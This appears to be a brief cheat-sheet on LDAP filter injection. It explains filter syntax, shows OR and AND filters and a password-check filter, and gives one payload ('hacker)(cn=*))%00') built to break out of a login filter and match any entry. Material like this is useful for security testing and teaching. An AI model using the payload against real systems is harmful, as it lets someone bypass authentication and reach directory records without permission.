LDAP Syntax:
```LDAP
(cn-[INPUT])
```

#### Filter Injections

boolean OR using |:
```LDAP
(|(cn=[INPUT1])(cn=[INPUT2])) to get records matching [INPUT1] or [INPUT2]
```

boolean AND using &:
```LDAP
(&(cn=[INPUT1])(userPassword=[INPUT2])) to get records for which the cn matches [INPUT1] and the password matches [INPUT2].
```

Hashed passwords filter:
```LDAP
(&(cn=[INPUT1])(userPassword=HASH[INPUT2]))
```

#### Payloads

```LDAP
hacker)(cn=*))%00
```
